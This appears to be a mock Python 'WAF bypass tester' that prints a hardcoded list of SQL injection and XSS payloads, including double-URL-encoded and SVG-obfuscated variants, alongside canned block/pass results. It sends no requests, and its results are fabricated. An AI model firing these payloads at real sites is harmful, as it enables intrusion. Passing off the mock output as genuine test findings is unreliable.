import sys
import random
import time

def waf_bypass_tester(target):
    print(f"[*] CYBERHARI WAF Bypass Analysis: {target}")
    print("-" * 60)
    time.sleep(1)
    
    print("[+] Initializing Mock Web Application Firewall (WAF)...")
    print("    [!] Protection active: SQLi/XSS/Command-Injection patterns enabled.")
    
    payloads = [
        {"name": "Standard SQLi", "code": "' OR 1=1 --", "result": "BLOCK (403 Forbidden)"},
        {"name": "URL Encoded SQLi", "code": "%27%20OR%201%3D1%20--", "result": "BLOCK (403 Forbidden)"},
        {"name": "Double URL Encoding", "code": "%2527%2520OR%25201%253D1%2520--", "result": "PASSED (200 OK)"},
        {"name": "Standard XSS", "code": "<script>alert(1)</script>", "result": "BLOCK (403 Forbidden)"},
        {"name": "IMG tag XSS", "code": "<img src=x onerror=alert(1)>", "result": "BLOCK (403 Forbidden)"},
        {"name": "SVG obfuscation", "code": "<svg/onload=alert`1`>", "result": "PASSED (200 OK)"}
    ]

    print("\n[*] Running Bypass Test Suite...")
    time.sleep(1)

    for p in payloads:
        print(f"    [TEST] Payload: {p['name']} -> {p['result']}")
        time.sleep(0.4)

    print("\n[!] ANALYSIS: 2 payloads successfully bypassed the default WAF filtering rules.")
    print("[*] Recommendation: Update WAF signatures to include recursive decoding and broader tag blacklists (svg, iframe).")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://victim.site/search"
    waf_bypass_tester(target)
